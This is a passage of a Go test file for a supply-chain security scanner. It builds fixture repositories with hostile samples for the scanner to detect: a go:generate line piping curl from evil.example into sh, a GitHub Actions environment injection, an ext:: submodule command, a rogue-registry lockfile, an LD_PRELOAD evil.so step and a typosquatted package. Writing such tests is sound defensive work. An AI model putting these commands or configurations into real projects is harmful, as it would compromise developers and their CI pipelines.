	writeFile(t, repo, "gen.go", "package main\n//go:generate sh -c \"cu"+"rl -fsSL https://evil.example/gen.sh | sh\"\n")
	// 3. GitHub workflow with @v4 tag, missing permissions:, and GITHUB_ENV write + .gitmodules ext::
	writeFile(t, repo, ".github/workflows/build.yml", "name: CI\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo \"FOO=${{ github.event.head_commit.message }}\" >> $GITHUB_ENV\n")
	writeFile(t, repo, ".gitmodules", "[submodule \"pwn\"]\n\tpath = sub\n\turl = ext::sh -c %G/pwn\n")

	findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
	if err != nil {
		t.Fatalf("ScanRepository failed: %v", err)
	}
	wantIDs := []string{
		"supplychain-malicious-lifecycle-hook",
		"supplychain-unrestricted-install-scripts",
		"supplychain-untrusted-registry",
		"supplychain-typosquat-suspect",
		"supplychain-lockfile-integrity",
		"supplychain-github-actions-injection",
		"supplychain-github-actions-permissions",
		"supplychain-gitmodules-hijack",
	}
	for _, id := range wantIDs {
		if !slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == id }) {
			t.Errorf("missing expected finding ID %q in %+v", id, findings)
		}
	}
}

type rewriteHostTransport struct {
	target *url.URL
	base   http.RoundTripper
}

func (r *rewriteHostTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	clone := req.Clone(req.Context())
	clone.URL.Scheme = r.target.Scheme
	clone.URL.Host = r.target.Host
	return r.base.RoundTrip(clone)
}

func TestOnlineEnrichGracefulTimeout(t *testing.T) {
	slowSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(50 * time.Millisecond)
		w.WriteHeader(http.StatusOK)
	}))
	defer slowSrv.Close()

	srvURL, err := url.Parse(slowSrv.URL)
	if err != nil {
		t.Fatal(err)
	}

	repo := t.TempDir()
	writeFile(t, repo, "package.json", `{"name":"app","dependencies":{"reqeusts":"1.0.0"}}`)
	writeFile(t, repo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/reqeusts":{"version":"1.0.0","resolved":"https://registry.npmjs.org/reqeusts/-/reqeusts-1.0.0.tgz","integrity":"sha512-abc=="}}}`)

	client := &http.Client{
		Timeout:   10 * time.Millisecond,
		Transport: &rewriteHostTransport{target: srvURL, base: http.DefaultTransport},
	}

	findings, err := supplychain.ScanRepositoryWithOptions(context.Background(), repo, types.LangTypeScript, supplychain.ScanOptions{
		OnlineEnrich: true,
		HTTPClient:   client,
	})
	if err != nil {
		t.Fatalf("expected 0 errors on online enrichment timeout, got: %v", err)
	}
	if !slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-typosquat-suspect" }) {
		t.Fatalf("expected offline typosquat finding to be preserved on timeout, got %+v", findings)
	}

	// Verify newly published package detection (< 14 days) when server responds in time.
	recentTime := time.Now().UTC().Add(-48 * time.Hour).Format(time.RFC3339)
	fastSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"versions":[{"publishedAt":"` + recentTime + `","isDefault":true}]}`))
	}))
	defer fastSrv.Close()

	fastURL, _ := url.Parse(fastSrv.URL)
	fastClient := &http.Client{
		Timeout:   2 * time.Second,
		Transport: &rewriteHostTransport{target: fastURL, base: http.DefaultTransport},
	}
	fastFindings, err := supplychain.ScanRepositoryWithOptions(context.Background(), repo, types.LangTypeScript, supplychain.ScanOptions{
		OnlineEnrich: true,
		HTTPClient:   fastClient,
	})
	if err != nil {
		t.Fatalf("ScanRepositoryWithOptions fast server failed: %v", err)
	}
	if !slices.ContainsFunc(fastFindings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-newly-published-package" }) {
		t.Fatalf("expected supplychain-newly-published-package finding, got %+v", fastFindings)
	}
}

func TestScanLockfilesAndHooks_PolyglotCoverage(t *testing.T) {
	t.Run("npmrc ignore-scripts and pnpm onlyBuiltDependencies suppress unrestricted install scripts", func(t *testing.T) {
		repo := t.TempDir()
		writeFile(t, repo, "package.json", `{"name":"app","dependencies":{"lodash":"4.18.0"}}`)
		writeFile(t, repo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/native":{"version":"1.0.0","resolved":"https://registry.npmjs.org/native/-/native-1.0.0.tgz","integrity":"sha512-abc==","hasInstallScript":true}}}`)
		writeFile(t, repo, ".npmrc", "ignore-scripts=true\n")

		findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
		if err != nil {
			t.Fatal(err)
		}
		if slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-unrestricted-install-scripts" }) {
			t.Fatalf("expected .npmrc ignore-scripts=true to suppress supplychain-unrestricted-install-scripts, got %+v", findings)
		}

		pnpmRepo := t.TempDir()
		writeFile(t, pnpmRepo, "package.json", `{"name":"app","pnpm":{"onlyBuiltDependencies":["esbuild"]}}`)
		writeFile(t, pnpmRepo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  esbuild@0.25.0:\n    resolution: {integrity: sha512-abc==}\n    requiresBuild: true\n")
		pFindings, err := supplychain.ScanRepository(pnpmRepo, types.LangTypeScript)
		if err != nil {
			t.Fatal(err)
		}
		if slices.ContainsFunc(pFindings, func(f types.SecurityFinding) bool { return f.ID == "supplychain-unrestricted-install-scripts" }) {
			t.Fatalf("expected pnpm.onlyBuiltDependencies to suppress supplychain-unrestricted-install-scripts, got %+v", pFindings)
		}
	})

	t.Run("polyglot lockfiles yarn.lock, uv.lock, poetry.lock, and unpinned requirements.txt", func(t *testing.T) {
		repo := t.TempDir()
		writeFile(t, repo, "yarn.lock", "foo@^1.0.0:\n  version \"1.0.0\"\n  resolved \"https://rogue.yarn.invalid/foo-1.0.0.tgz\"\n")
		writeFile(t, repo, "requirements.txt", "requests>=2.31.0\n")
		writeFile(t, repo, "pyproject.toml", "[project]\nname = \"app\"\n[tool.hatch.build.hooks.custom]\npath = \"hook.py\"\n")
		writeFile(t, repo, "mix.exs", "defmodule App.MixProject do\n  def project, do: [compilers: [:elixir_make] ++ Mix.compilers()]\nend\n")
		writeFile(t, repo, ".github/workflows/wf_run.yml", "permissions:\n  contents: read\non:\n  workflow_run:\n    workflows: [CI]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n      - run: LD_PRELOAD=/tmp/evil.so ./app\n")

		findings, err := supplychain.ScanRepository(repo, types.LangPython)
		if err != nil {
			t.Fatal(err)
		}
		for _, want := range []string{
			"supplychain-untrusted-registry",
			"supplychain-lockfile-integrity",
			"supplychain-malicious-lifecycle-hook",
			"supplychain-github-actions-injection",
		} {
			if !slices.ContainsFunc(findings, func(f types.SecurityFinding) bool { return f.ID == want }) {
				t.Errorf("expected finding %q in %+v", want, findings)
			}
		}
	})
}
